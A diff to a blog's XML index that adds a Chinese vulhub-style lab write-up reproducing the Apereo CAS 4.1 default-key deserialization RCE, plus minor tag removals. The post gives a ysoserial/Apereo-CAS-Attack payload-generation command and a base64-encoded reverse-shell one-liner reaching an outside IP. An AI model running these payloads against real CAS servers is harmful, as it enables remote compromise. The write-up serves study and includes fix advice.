@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Apereo CAS 4.1 反序列化命令执行漏洞复现</title>
+      <link href="/posts/60630/"/>
+      <url>/posts/60630/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。Apereo CAS存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Apereo CAS &lt;&#x3D; 4.1.7 </p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="https://image.jh2ing.com/image-20220702172835955.png" alt="image-20220702172835955"></p><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p><p><img src="https://image.jh2ing.com/image-20220702172902702.png" alt="image-20220702172902702"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression = true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...</span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/success&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.jh2ing.com/image-20220702173138357.png" alt="image-20220702173138357"></p><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><p><img src="https://image.jh2ing.com/image-20220702173613099.png" alt="image-20220702173613099"></p><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行：</p><p><img src="https://image.jh2ing.com/image-20220702173816165.png" alt="image-20220702173816165"></p><p>反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 对shell语句进行base64加密</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIu.....&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.jh2ing.com/image-20220702200352565.png" alt="image-20220702200352565"></p><p><img src="https://image.jh2ing.com/image-20220702200450867.png" alt="image-20220702200450867"></p><p><img src="https://image.jh2ing.com/image-20220702200557519.png" alt="image-20220702200557519"></p><blockquote><p>建议在base64加密时使用burp中的加密工具</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>修改Webflow中的默认密钥</li><li>升级到最新版</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>AppWeb 漏洞复现</title>
       <link href="/posts/57611/"/>
       <url>/posts/57611/</url>
@@ -21,8 +46,6 @@
         <tags>
             
             <tag> vulhub </tag>
-            
-            <tag> AppWeb </tag>
             
         </tags>
       
@@ -48,8 +71,6 @@
         <tags>
             
             <tag> vulhub </tag>
-            
-            <tag> ActiveMQ </tag>
             
         </tags>
       
